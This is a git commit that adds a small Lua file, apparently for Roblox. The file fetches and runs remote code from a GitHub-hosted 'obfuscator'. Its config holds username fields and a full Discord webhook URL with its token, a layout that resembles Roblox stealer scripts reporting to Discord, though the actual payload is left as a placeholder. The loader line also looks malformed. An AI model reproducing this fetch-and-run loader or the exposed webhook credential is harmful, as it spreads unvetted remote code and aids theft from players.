45718dca3d303c97323fd744adf3f6b814c758a4
Yuzhu <kuritoalt4@gmail.com>
2025-02-12 15:40:56 +0800

    Add 4be7f5095ecea3a9123c.lua by 1

---
+++ 4be7f5095ecea3a9123c.lua
@@ -0,0 +1,15 @@
+
+    local YuzhuOBF = require(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/YuzhuScripts/Obfuscator/refs/heads/main/YuzhuOBF.lua")))
+
+    YuzhuOBF(
+    [===[
+    Username = "1"
+    Username2 = "nil"
+    Webhook = "https://discord.com/api/webhooks/1338857260776034355/d_x8y8rQhMHNafA81ACUzNwQ4bcB_mB8HxZLpFfpHnnw93O02Fhq_BE0k2bom9QZx_Bo"
+
+    -- CODE SOURCE
+    ]===],
+    "Yuzhu_", --// Custom Variable
+    "Protected" --// WaterMark
+    )
+    
